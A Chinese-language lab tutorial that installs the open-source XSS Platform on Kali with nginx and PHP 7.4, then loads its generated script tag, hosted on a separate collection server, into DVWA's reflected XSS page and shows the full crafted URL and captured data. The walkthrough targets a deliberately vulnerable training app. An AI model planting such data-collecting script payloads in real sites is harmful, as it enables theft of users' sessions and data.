XSS 靶场。

## 1 环境搭建

安装依赖

```
┌──(root㉿Kali-24)-[~]
└─# apt -y install lsb-release apt-transport-https ca-certificates
```

下载 PHP 软件包的数字签名

```
┌──(root㉿Kali-24)-[~]
└─# wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
```

添加 php 源

```
┌──(root㉿Kali-24)-[~]
└─# echo "deb https://packages.sury.org/php/ buster main" >/etc/apt/sources.list.d/php.list
```

获取更新列表

```
┌──(root㉿Kali-24)-[~]
└─# apt update
```

下载 libffi6_3.2.1-9_amd64.deb

```
┌──(root㉿Kali-24)-[~]
└─# wget http://ftp.us.debian.org/debian/pool/main/libf/libffi/libffi6_3.2.1-9_amd64.deb
```

> http://ftp.us.debian.org/debian/pool/main/libf/libffi/

安装 libffi6

```
┌──(root㉿Kali-24)-[~]
└─# dpkg -i libffi6_3.2.1-9_amd64.deb
```

安装 php7.4

```
┌──(root㉿Kali-24)-[~]
└─# apt install -y php7.4-fpm php7.4-mysql
```

使 php7.4 开机自启

```
┌──(root㉿Kali-24)-[~]
└─# systemctl enable --now php7.4-fpm.service
```

上传 nginx 配置文件 xuegodxss，移动站点启用目录中

```
┌──(root㉿Kali-24)-[~]
└─# mv xuegodxss /etc/nginx/sites-enabled/
```

修改配置文件 xuegodxss

```
┌──(root㉿Kali-24)-[~]
└─# sed -i 's/server_name xuegodxss\.cn;/server_name 192.168.1.24;/g' /etc/nginx/sites-enabled/xuegodxss
```

启动 nginx 服务

```
┌──(root㉿Kali-24)-[~]
└─# systemctl enable --now nginx.service
```

下载 XSSPlatform

```
┌──(root㉿Kali-24)-[~]
└─# git clone https://github.com/78778443/xssplatform.git
```

> 使用代理记得移除

移动 XSS 平台到站点根目录

```
┌──(root㉿Kali-24)-[~]
└─# mv xssplatform /var/www/html/xssplatform
```

修改文件权限

```
┌──(root㉿Kali-24)-[~]
└─# chown www-data:www-data -R /var/www/html
```

kali 浏览器访问

> http://192.168.1.24/

配置数据库连接信息和管理员账户

| 配置       | 信息        |
| ---------- | ----------- |
| 数据库地址 | 127.0.0.1   |
| 数据库用户 | root        |
| 数据库密码 | mysql       |
| 数据库     | xssplatfrom |
| 管理员     | admin       |
| 管理员密码 | admin       |

## 2 基本使用

启动 Nginx

```
┌──(root㉿Kali-24)-[~]
└─# systemctl start nginx.service
```

登录

>http://192.168.1.24/
>
>管理员  	admin
>管理员密码	admin

查看代码

![查看代码](./../../../../images/XSS%20Platform/%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%A0%81.png)

> XSS 平台提供一个 js 代码，只需要通过 XSS 加载 js 代码即可使用，和 beef-xss 非常像

选择代码

![选择代码](./../../../../images/XSS%20Platform/%E9%80%89%E6%8B%A9%E4%BB%A3%E7%A0%81.png)

```
<script src=http://192.168.1.24/Q7yYOv?1687665509></script>
```

登录 DVWA

> http://192.168.1.76/DVWA/

> admin
>
> password

进入 `XSS (Reflected)`

提交代码

查看地址栏

```
http://192.168.1.76/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2F192.168.1.24%2FQ7yYOv%3F1687665509%3E%3C%2Fscript%3E#
```

在 XSS 平台查看接受的内容

![在 XSS 平台查看接受的内容](./../../../../images/XSS%20Platform/%E5%9C%A8%20XSS%20%E5%B9%B3%E5%8F%B0%E6%9F%A5%E7%9C%8B%E6%8E%A5%E5%8F%97%E7%9A%84%E5%86%85%E5%AE%B9.png)

---

参考链接

- [XSS Platform](https://github.com/78778443/xssplatform)